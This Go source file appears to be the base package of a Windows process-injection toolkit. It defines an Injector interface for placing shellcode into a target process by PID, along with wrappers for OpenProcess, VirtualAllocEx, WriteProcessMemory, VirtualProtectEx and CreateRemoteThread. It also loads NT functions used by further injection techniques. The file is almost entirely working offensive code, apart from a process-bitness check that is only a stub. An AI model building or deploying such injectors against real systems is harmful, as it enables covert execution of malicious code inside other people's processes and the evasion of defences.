package injection

import (
	"errors"
	"fmt"
	"syscall"
	"unsafe"
)

// Common Windows constants and types needed for process injection
const (
	// Memory allocation types
	MEM_COMMIT             = 0x00001000
	MEM_RESERVE            = 0x00002000
	MEM_RELEASE            = 0x00008000
	
	// Memory protection constants
	PAGE_EXECUTE           = 0x10
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READWRITE         = 0x04
	
	// Process access rights
	PROCESS_ALL_ACCESS     = 0x1F0FFF
	PROCESS_CREATE_THREAD  = 0x0002
	PROCESS_VM_OPERATION   = 0x0008
	PROCESS_VM_READ        = 0x0010
	PROCESS_VM_WRITE       = 0x0020
	PROCESS_QUERY_INFORMATION = 0x0400
	
	// Thread creation flags
	CREATE_SUSPENDED       = 0x00000004
	
	// Wait constants
	INFINITE               = 0xFFFFFFFF
)

// Windows API function types
type (
	HANDLE uintptr
	DWORD  uint32
	LPVOID uintptr
	SIZE_T uintptr
)

// Injector is the base interface for all injection techniques
type Injector interface {
	// Inject injects shellcode into a target process
	Inject(pid int, shellcode []byte) error
	
	// Name returns the name of the injection technique
	Name() string
	
	// Description returns a description of the injection technique
	Description() string
}

// BaseInjector contains common functionality for all injectors
type BaseInjector struct {
	name        string
	description string
}

// Name returns the name of the injection technique
func (b *BaseInjector) Name() string {
	return b.name
}

// Description returns a description of the injection technique
func (b *BaseInjector) Description() string {
	return b.description
}

// Common Windows API functions used by injectors
var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	
	// Process and thread functions
	openProcess            = kernel32.NewProc("OpenProcess")
	createRemoteThread     = kernel32.NewProc("CreateRemoteThread")
	waitForSingleObject    = kernel32.NewProc("WaitForSingleObject")
	closeHandle            = kernel32.NewProc("CloseHandle")
	getExitCodeThread      = kernel32.NewProc("GetExitCodeThread")
	createProcess          = kernel32.NewProc("CreateProcessW")
	resumeThread           = kernel32.NewProc("ResumeThread")
	suspendThread          = kernel32.NewProc("SuspendThread")
	getThreadContext       = kernel32.NewProc("GetThreadContext")
	setThreadContext       = kernel32.NewProc("SetThreadContext")
	
	// Memory functions
	virtualAllocEx         = kernel32.NewProc("VirtualAllocEx")
	virtualFreeEx          = kernel32.NewProc("VirtualFreeEx")
	writeProcessMemory     = kernel32.NewProc("WriteProcessMemory")
	readProcessMemory      = kernel32.NewProc("ReadProcessMemory")
	virtualProtectEx       = kernel32.NewProc("VirtualProtectEx")
	
	// NT API functions
	ntCreateThreadEx       = ntdll.NewProc("NtCreateThreadEx")
	rtlCreateUserThread    = ntdll.NewProc("RtlCreateUserThread")
	ntQueueApcThread       = ntdll.NewProc("NtQueueApcThread")
)

// OpenProcess opens a handle to a process
func OpenProcess(desiredAccess DWORD, inheritHandle bool, processId DWORD) (HANDLE, error) {
	inherit := 0
	if inheritHandle {
		inherit = 1
	}
	
	handle, _, err := openProcess.Call(
		uintptr(desiredAccess),
		uintptr(inherit),
		uintptr(processId),
	)
	
	if handle == 0 {
		return 0, fmt.Errorf("OpenProcess failed: %v", err)
	}
	
	return HANDLE(handle), nil
}

// VirtualAllocEx allocates memory in a remote process
func VirtualAllocEx(hProcess HANDLE, lpAddress LPVOID, dwSize SIZE_T, flAllocationType DWORD, flProtect DWORD) (LPVOID, error) {
	addr, _, err := virtualAllocEx.Call(
		uintptr(hProcess),
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect),
	)
	
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}
	
	return LPVOID(addr), nil
}

// WriteProcessMemory writes data to a remote process
func WriteProcessMemory(hProcess HANDLE, lpBaseAddress LPVOID, lpBuffer []byte, nSize SIZE_T) error {
	var bytesWritten uintptr
	
	result, _, err := writeProcessMemory.Call(
		uintptr(hProcess),
		uintptr(lpBaseAddress),
		uintptr(unsafe.Pointer(&lpBuffer[0])),
		uintptr(nSize),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	
	if result == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	
	if bytesWritten != uintptr(nSize) {
		return fmt.Errorf("WriteProcessMemory: wrote %d bytes, expected %d", bytesWritten, nSize)
	}
	
	return nil
}

// VirtualProtectEx changes the protection of a memory region in a remote process
func VirtualProtectEx(hProcess HANDLE, lpAddress LPVOID, dwSize SIZE_T, flNewProtect DWORD) (DWORD, error) {
	var oldProtect DWORD
	
	result, _, err := virtualProtectEx.Call(
		uintptr(hProcess),
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	
	if result == 0 {
		return 0, fmt.Errorf("VirtualProtectEx failed: %v", err)
	}
	
	return oldProtect, nil
}

// CreateRemoteThread creates a thread in a remote process
func CreateRemoteThread(hProcess HANDLE, lpThreadAttributes LPVOID, dwStackSize SIZE_T, 
	lpStartAddress LPVOID, lpParameter LPVOID, dwCreationFlags DWORD) (HANDLE, error) {
	
	var threadId DWORD
	
	handle, _, err := createRemoteThread.Call(
		uintptr(hProcess),
		uintptr(lpThreadAttributes),
		uintptr(dwStackSize),
		uintptr(lpStartAddress),
		uintptr(lpParameter),
		uintptr(dwCreationFlags),
		uintptr(unsafe.Pointer(&threadId)),
	)
	
	if handle == 0 {
		return 0, fmt.Errorf("CreateRemoteThread failed: %v", err)
	}
	
	return HANDLE(handle), nil
}

// CloseHandle closes a handle
func CloseHandle(hObject HANDLE) error {
	result, _, err := closeHandle.Call(uintptr(hObject))
	
	if result == 0 {
		return fmt.Errorf("CloseHandle failed: %v", err)
	}
	
	return nil
}

// WaitForSingleObject waits for an object to be signaled
func WaitForSingleObject(hHandle HANDLE, dwMilliseconds DWORD) DWORD {
	result, _, _ := waitForSingleObject.Call(
		uintptr(hHandle),
		uintptr(dwMilliseconds),
	)
	
	return DWORD(result)
}

// GetExitCodeThread gets the exit code of a thread
func GetExitCodeThread(hThread HANDLE) (DWORD, error) {
	var exitCode DWORD
	
	result, _, err := getExitCodeThread.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(&exitCode)),
	)
	
	if result == 0 {
		return 0, fmt.Errorf("GetExitCodeThread failed: %v", err)
	}
	
	return exitCode, nil
}

// IsProcessRunning checks if a process is running
func IsProcessRunning(pid int) bool {
	handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, DWORD(pid))
	if err != nil {
		return false
	}
	defer CloseHandle(handle)
	
	return true
}

// ValidateShellcode performs basic validation on shellcode
func ValidateShellcode(shellcode []byte) error {
	if len(shellcode) == 0 {
		return errors.New("shellcode is empty")
	}
	
	if len(shellcode) < 10 {
		return errors.New("shellcode is too short")
	}
	
	return nil
}

// GetProcessBits determines if a process is 32-bit or 64-bit
func GetProcessBits(pid int) (int, error) {
	// This is a simplified implementation
	// In a real implementation, you would use IsWow64Process
	// For now, we'll assume 64-bit
	return 64, nil
}
